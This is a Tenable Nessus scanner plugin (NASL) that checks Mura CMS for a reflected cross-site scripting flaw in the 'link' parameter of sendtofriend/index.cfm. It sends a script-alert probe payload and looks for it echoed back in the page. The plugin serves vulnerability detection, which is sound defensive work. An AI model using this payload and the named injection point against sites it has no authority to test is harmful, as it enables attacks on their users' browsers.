#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(49699);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/01/14 03:46:11 $");

  script_bugtraq_id(42180);
  script_osvdb_id(59579);
  script_xref(name:"EDB-ID", value:"9898");

  script_name(english:"Mura CMS link Parameter XSS");
  script_summary(english:"Tries to inject script code via default/includes/display_objects/sendtofriend/index.cfm");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a ColdFusion script that is prone to a
cross-site scripting attack.");
  script_set_attribute(attribute:"description", value:
"The version of Mura CMS hosted on the remote web server fails to
sanitize user-supplied input to the 'link' parameter of the
'default/includes/display_objects/sendtofriend/index.cfm' script
before using it to generate dynamic HTML output.

An attacker may be able to leverage this issue to inject arbitrary
HTML or script code into a user's browser to be executed within the
security context of the affected site.

Note that the install is also likely to be affected by two other
cross-site scripting vulnerabilities, although Nessus has not checked
for them.");
  script_set_attribute(attribute:"see_also", value:"http://www.getmura.com/index.cfm/blog/mura-cms-xss-vulnerability-fix/");
  script_set_attribute(attribute:"solution", value:
"Either apply the appropriate security patch referenced in the vendor's
advisory or upgrade to version 5.1.967 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/10/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/10/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/09/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("mura_cms_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/mura_cms");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, embedded:FALSE);


install = get_install_from_kb(appname:'mura_cms', port:port, exit_on_fail:TRUE);
dir = install['dir'];


# Try to exploit the issue.
alert = '">' + "<script>alert('" + SCRIPT_NAME + "')</script>";
cgi = '/default/includes/display_objects/sendtofriend/index.cfm';

vuln = test_cgi_xss(
  port     : port,
  cgi      : cgi,
  dirs     : make_list(dir),
  qs       : 'siteid=default&link='+urlencode(str:alert),
  pass_str : 'input type="hidden" name="link" value="'+alert,
  pass2_re : 'action="sendlink\\.cfm"'
);
if (!vuln) exit(0, "The Mura CMS install at "+build_url(port:port, qs:dir+'/')+" is not affected.");
